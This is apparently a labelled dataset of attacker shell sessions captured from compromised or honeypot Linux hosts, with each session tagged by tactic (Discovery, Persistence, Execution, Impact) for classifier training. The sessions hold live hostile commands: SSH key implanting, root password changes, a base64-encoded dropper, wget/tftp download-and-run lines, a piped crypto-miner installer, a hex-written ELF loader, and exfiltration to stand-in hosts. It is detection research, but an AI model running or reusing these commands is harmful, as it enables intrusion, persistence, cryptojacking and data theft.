,session,labels
"cat /proc/cpuinfo | grep name | wc -l ; echo -e 1nQEgz0zQrUX8ZnQEgz0zQrUX8Z | passwd | bash ; Enter new UNIX password: ; echo 1nQEgz0zQrUX8ZnQEgz0zQrUX8Zn | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; echo admin 1 > /tmp/up.txt ; rm -rf /var/tmp/dota* ; cat /var/tmp/.systemcache436621 ; echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s && cd /var/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4CnJtIC1yZiAuWDIqCm1rZGlyIC5YMjUtdW5peApjZCAuWDI1LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgyNS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgyNS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgyNS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMjUtdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA== | base64 --decode | bash ; whoami ;","cat /proc/cpuinfo | grep name | wc -l ; echo -e 1nQEgz0zQrUX8ZnQEgz0zQrUX8Z | passwd | bash ; Enter new UNIX password: ; echo 1nQEgz0zQrUX8ZnQEgz0zQrUX8Zn | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; echo admin 1 > /tmp/up.txt ; rm -rf /var/tmp/dota* ; cat /var/tmp/.systemcache436621 ; echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s && cd /var/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4CnJtIC1yZiAuWDIqCm1rZGlyIC5YMjUtdW5peApjZCAuWDI1LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgyNS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgyNS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgyNS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMjUtdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA== | base64 --decode | bash ; whoami ;",Discovery - 2 -- Persistence - 5 -- Harmless - 6 -- Persistence - 8 -- Discovery - 29 -- Persistence - 36 -- Persistence - 40 -- Execution - 46
sudo hive-passwd sdgji34rhgxer12dfg334h5ghsdfgdfji ; sudo pkill Xorg ; sudo pkill x11vnc ;,sudo hive-passwd sdgji34rhgxer12dfg334h5ghsdfgdfji ; sudo pkill Xorg ; sudo pkill x11vnc ;,Persistence - 0 -- Impact - 2
"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo root:xRMMetb5M3WA | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;","cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo root:xRMMetb5M3WA | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",Persistence - 4 -- Discovery - 8 -- Persistence - 11 -- Discovery - 53
stty raw -echo ; LANG=C ; printf command_start_%s URdAloyE ; uname -a ; printf command_done_%s yzVT3Ejy ;,stty raw -echo ; LANG=C ; printf command_start_%s URdAloyE ; uname -a ; printf command_done_%s yzVT3Ejy ;,Discovery - 4
chmod 777 /tmp/.xs/daemon.i686.mod ; chmod 777 /tmp/.xs/daemon.armv4l.mod ; /tmp/.xs/daemon.armv4l.mod ;,chmod 777 /tmp/.xs/daemon.i686.mod ; chmod 777 /tmp/.xs/daemon.armv4l.mod ; /tmp/.xs/daemon.armv4l.mod ;,Execution - 2
chmod 0777 /tmp/Lindgde4 ;,chmod 0777 /tmp/Lindgde4 ;,Harmless - 0
ls ; curl ident.me ; curl ; curl google.com ; clear ; curl wttr.in ; ps x ; w ; lst ; last ;,ls ; curl ident.me ; curl ; curl google.com ; clear ; curl wttr.in ; ps x ; w ; lst ; last ;,Discovery - 9
scp -t /tmp/qf01tMjz ; cd /tmp && chmod +x qf01tMjz && bash -c ./qf01tMjz ; ./qf01tMjz ;,scp -t /tmp/qf01tMjz ; cd /tmp && chmod +x qf01tMjz && bash -c ./qf01tMjz ; ./qf01tMjz ;,Execution - 4
sudo hive-passwd 21w3r23ewqfgja1s5r6j1f2314tdf2124s111 ; sudo pkill Xorg ; sudo pkill x11vnc ; sudo service shellinabox stop ;,sudo hive-passwd 21w3r23ewqfgja1s5r6j1f2314tdf2124s111 ; sudo pkill Xorg ; sudo pkill x11vnc ; sudo service shellinabox stop ;,Persistence - 0 -- Impact - 3
chmod -R 777 sass ; chmod -R 777 sass ; chmod -R 777 sass ; ./sass ; ./sass ;,chmod -R 777 sass ; ./sass ;,Execution - 1
./gay ;,./gay ;,Execution - 0
/usr/bin/tee /usr/libexec/pyhhax > /dev/null ; /usr/bin/cat > /usr/libexec/pyhhax ; scp -tr /usr/local/bin/ ; C0755 3277352 pyhhax ;,/usr/bin/tee /usr/libexec/pyhhax > /dev/null ; /usr/bin/cat > /usr/libexec/pyhhax ; scp -tr /usr/local/bin/ ; C0755 3277352 pyhhax ;,Execution - 3
"find `grep -E ""\Wrw\W"" /proc/mounts | cut -d' ' -f2 | sort | uniq` -xdev -type d -writable > /dev/null ; echo -e \x31\x54\x35\x4b ;","find `grep -E ""\Wrw\W"" /proc/mounts | cut -d' ' -f2 | sort | uniq` -xdev -type d -writable > /dev/null ; echo -e \x31\x54\x35\x4b ;",Discovery - 4
/usr/bin/tee /usr/local/bin/begltz > /dev/null ; /usr/bin/cat > /usr/local/bin/begltz ;,/usr/bin/tee /usr/local/bin/begltz > /dev/null ; /usr/bin/cat > /usr/local/bin/begltz ;,Execution - 1
echo -e x6Fx6B ; uname -m ; mkdir /usr/.work ; scp -t /usr/.work/ ; scp -t /usr/.work/ ; scp -t /usr/.work/ ; scp -t /usr/.work/ ; chmod +x /usr/.work/work32 ; /usr/.work/work32 root wangping ; sleep 2 ; chmod +x /usr/.work/work64 ; /usr/.work/work64 root wangping ; sleep 2 ;,echo -e x6Fx6B ; uname -m ; mkdir /usr/.work ; scp -t /usr/.work/ ; chmod +x /usr/.work/work32 ; /usr/.work/work32 root wangping ; sleep 2 ; chmod +x /usr/.work/work64 ; /usr/.work/work64 root wangping ; sleep 2 ;,Discovery - 1 -- Execution - 9
echo -e '\\x41\\x4b\\x34\\x37' ; cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || wget http://0.0.0.0/update.sh ; busybox wget http://0.0.0.0/update.sh ; tftp -r update.sh -g 0.0.0.0 ; busybox tftp -r update.sh -g 0.0.0.0 ; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh ; busybox ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh ; chmod 777 update.sh ; busybox chmod 777 update.sh ; sh update.sh ; rm -rf update.sh ;,echo -e '\\x41\\x4b\\x34\\x37' ; cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || wget http://0.0.0.0/update.sh ; busybox wget http://0.0.0.0/update.sh ; tftp -r update.sh -g 0.0.0.0 ; busybox tftp -r update.sh -g 0.0.0.0 ; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh ; busybox ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh ; chmod 777 update.sh ; busybox chmod 777 update.sh ; sh update.sh ; rm -rf update.sh ;,Harmless - 0 -- Execution - 14 -- Defense Evasion - 15
echo -en \\x00\\x6a\\x60\\x34\\x32\\x37\\x37\\x00\\x76\\x66\\x7d\\x7f\\x74\\x70\\x00\\x60\\x75\\x68\\x72\\x73\\x62\\x75\\x00\\x71\\x62\\x75\\x73\\x62\\x7f\\x35\\x32\\x62\\x6c ;,echo -en \\x00\\x6a\\x60\\x34\\x32\\x37\\x37\\x00\\x76\\x66\\x7d\\x7f\\x74\\x70\\x00\\x60\\x75\\x68\\x72\\x73\\x62\\x75\\x00\\x71\\x62\\x75\\x73\\x62\\x7f\\x35\\x32\\x62\\x6c ;,Harmless - 0
passwd ;,passwd ;,Discovery - 0
pkill screen ; pkill Xorg ; pkill x86_64 ; pkill x86 ; pkill xmrig ; pkill cnrig ; pkill xmr ; curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA ; echo root:ts43gturi1323 | chpasswd | bash ;,pkill screen ; pkill Xorg ; pkill x86_64 ; pkill x86 ; pkill xmrig ; pkill cnrig ; pkill xmr ; curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA ; echo root:ts43gturi1323 | chpasswd | bash ;,Execution - 8 -- Persistence - 11
echo try ;,echo try ;,Harmless - 0
scp -tr /usr/libexec/ ; C0755 3069524 uihtkx ; /usr/bin/tar Pxvf - ; /usr/bin/tee /usr/libexec/uihtkx > /dev/null ; /usr/bin/cat > /usr/libexec/uihtkx ;,scp -tr /usr/libexec/ ; C0755 3069524 uihtkx ; /usr/bin/tar Pxvf - ; /usr/bin/tee /usr/libexec/uihtkx > /dev/null ; /usr/bin/cat > /usr/libexec/uihtkx ;,Execution - 4
"cat /proc/cpuinfo | grep name | wc -l ; echo root:O'lu9-D8jSRf | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; nproc ; top ; uname ; uname -a ; lscpu | grep Model ;","cat /proc/cpuinfo | grep name | wc -l ; echo root:O'lu9-D8jSRf | chpasswd | bash ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; nproc ; top ; uname ; uname -a ; lscpu | grep Model ;",Discovery - 2 -- Persistence - 5 -- Discovery - 23
enable ; system ; shell ; sh ; cat /proc/mounts ; /bin/busybox JJHGP ; cd /dev/shm ; cat .s || cp /bin/echo .s ; /bin/busybox JJHGP ; tftp ; wget ; /bin/busybox JJHGP ; dd bs=52 count=1 if=.s || cat .s || while read i ; do echo $i ; done < .s ; /bin/busybox JJHGP ; >.s ; cp .s .i ; echo -ne '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x00\x01\x00\x34\x00\x00\x00\x40\x01\x00\x00\x00\x02\x00\x05\x34\x00\x20\x00\x01\x00\x28\x00\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00' >> .s ; echo -ne '\x00\x00\x01\x00\xf8\x00\x00\x00\xf8\x00\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x70\x10\x8f\xe2\x10\x20\xa0\xe3' >> .s ; echo -ne '\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x4f\x4f\x4d\xe2\x05\x50\x45\xe0\x06\x00\xa0\xe1\x04\x10\xa0\xe1\x4b\x2f\xa0\xe3\x01\x3c\xa0\xe3\x0f\x00\x2d\xe9\x0a\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x10\xd0\x8d\xe2' >> .s ; echo -ne '\x00\x50\x85\xe0\x00\x00\x50\xe3\x04\x00\x00\xda\x00\x20\xa0\xe1\x01\x00\xa0\xe3\x04\x10\xa0\xe1\x04\x00\x90\xef\xee\xff\xff\xea\x4f\xdf\x8d\xe2\x00\x00\x40\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x36\x92\x2f\x14\x29\xb1\x41\x26\x00\x00\x00\x61\x65\x61' >> .s ; echo -ne '\x62\x69\x00\x01\x1c\x00\x00\x00\x05\x43\x6f\x72\x74\x65\x78\x2d\x41\x35\x00\x06\x0a\x07\x41\x08\x01\x09\x02\x2a\x01\x44\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00' >> .s ; echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x54\x00\x01\x00\x54\x00\x00\x00\xa4\x00\x00\x00' >> .s ; echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00' >> .s ; echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00' >> .s ; ./.s>.i ; chmod 777 .i ; ./.i ; rm .s ; exit ;,enable ; system ; shell ; sh ; cat /proc/mounts ; /bin/busybox JJHGP ; cd /dev/shm ; cat .s || cp /bin/echo .s ; /bin/busybox JJHGP ; tftp ; wget ; /bin/busybox JJHGP ; dd bs=52 count=1 if=.s || cat .s || while read i ; do echo $i ; done < .s ; /bin/busybox JJHGP ; >.s ; cp .s .i ; echo -ne '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x00\x01\x00\x34\x00\x00\x00\x40\x01\x00\x00\x00\x02\x00\x05\x34\x00\x20\x00\x01\x00\x28\x00\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00' >> .s ; echo -ne '\x00\x00\x01\x00\xf8\x00\x00\x00\xf8\x00\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x70\x10\x8f\xe2\x10\x20\xa0\xe3' >> .s ; echo -ne '\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x4f\x4f\x4d\xe2\x05\x50\x45\xe0\x06\x00\xa0\xe1\x04\x10\xa0\xe1\x4b\x2f\xa0\xe3\x01\x3c\xa0\xe3\x0f\x00\x2d\xe9\x0a\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x10\xd0\x8d\xe2' >> .s ; echo -ne '\x00\x50\x85\xe0\x00\x00\x50\xe3\x04\x00\x00\xda\x00\x20\xa0\xe1\x01\x00\xa0\xe3\x04\x10\xa0\xe1\x04\x00\x90\xef\xee\xff\xff\xea\x4f\xdf\x8d\xe2\x00\x00\x40\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x36\x92\x2f\x14\x29\xb1\x41\x26\x00\x00\x00\x61\x65\x61' >> .s ; echo -ne '\x62\x69\x00\x01\x1c\x00\x00\x00\x05\x43\x6f\x72\x74\x65\x78\x2d\x41\x35\x00\x06\x0a\x07\x41\x08\x01\x09\x02\x2a\x01\x44\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00' >> .s ; echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x54\x00\x01\x00\x54\x00\x00\x00\xa4\x00\x00\x00' >> .s ; echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00' >> .s ; echo -ne '\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00' >> .s ; ./.s>.i ; chmod 777 .i ; ./.i ; rm .s ; exit ;,Discovery - 17 -- Execution - 31 -- Defense Evasion - 33
ping ; cd /tmp ; tftp -r rr -l rr -g 51.15.135.96 ; sh rr ;,ping ; cd /tmp ; tftp -r rr -l rr -g 51.15.135.96 ; sh rr ;,Discovery - 0 -- Execution - 3
scp -tr /usr/bin/ ; C0755 3434280 hyhvjs ;,scp -tr /usr/bin/ ; C0755 3434280 hyhvjs ;,Execution - 1
scp -t /tmp/DIvJewHc ; cd /tmp && chmod +x DIvJewHc && bash -c ./DIvJewHc ; ./DIvJewHc ; scp -t /tmp/DIvJewHc ;,scp -t /tmp/DIvJewHc ; cd /tmp && chmod +x DIvJewHc && bash -c ./DIvJewHc ; ./DIvJewHc ;,Execution - 4
cat /proc/cpuinfo ; which python && python --version ;,cat /proc/cpuinfo ; which python && python --version ;,Discovery - 2
/bin/busybox echo -en '\\x78\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x06\\x00\\x01\\x00\\x00\\x64\\x74\\xe5\\x51\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >> .onu_igmpv3 ; /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45' ;,/bin/busybox echo -en '\\x78\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x06\\x00\\x01\\x00\\x00\\x64\\x74\\xe5\\x51\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >> .onu_igmpv3 ; /bin/busybox echo -en '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45' ;,Harmless - 1
scp -r /var/mail user@attacker.example.com:/home/attacker/hacked_mails/ ; echo ' -/.bash history' ;,scp -r /var/mail user@attacker.example.com:/home/attacker/hacked_mails/ ; echo ' -/.bash history' ;,Other - 0 -- Defense Evasion - 1
mysqldump -u root -p users_users | nc 192.0.2.10 5678 ;,mysqldump -u root -p users_users | nc 192.0.2.10 5678 ;,Other - 1
